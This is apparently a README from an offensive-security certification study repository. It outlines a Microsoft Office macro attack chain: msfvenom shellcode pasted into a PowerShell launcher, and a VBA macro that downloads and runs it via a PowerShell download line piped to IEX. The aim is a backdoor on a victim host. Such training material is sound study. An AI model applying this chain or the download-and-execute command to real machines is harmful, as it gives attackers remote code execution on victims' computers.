### Microsoft Office Attacks.

The client-side attacks based on Microsoft Office's programs is a type of attack that involves the macros feature of Microsoft Office tools in a procedure that leads to RCE on victim's host. This macros are based in VBA.

In this repository we can find some scripts and procedures to craft and test macros that run arbitrary code when this gets open.

In summary, if we want to create a backdoor connection in a victim machine we must go step by step:

- First we craft our shellcode with the help of [ShellCode.sh](https://github.com/qv1ntv5/OSEP/blob/main/ClientSideAttacks/Payloads/MsfVenom/ShellCode.sh) file. 

- Once we craft it, we paste it in the '$buf' variable of [VBAenvlauncher.ps1](https://github.com/qv1ntv5/OSEP/blob/main/ClientSideAttacks/MicrosoftOffice/PowerShell/VBAenvlauncher.ps1) script.

- Then, we make use of [PSHTTPDownloader.vba](https://github.com/qv1ntv5/OSEP/blob/main/ClientSideAttacks/MicrosoftOffice/VBA/PSHTTPDownloader.vba) to download and execute the prepared VBAenvlauncher.ps1 script. It is worth to note that in PSHTTPDownloader we must add to the downloader line, stored in *str* var, the term **| IEX** in order to make powershell to also execute the contents of the script he previously has downloaded.

    ```powershell
    powershell (New-Object System.Net.WebClient).DownloadFile('<URL>', '<OUTFILE>') | IEX
    ```

The rest of scripts present on this repository are only to help the reader to understand the main scripts necesary to perform the operation.

<br>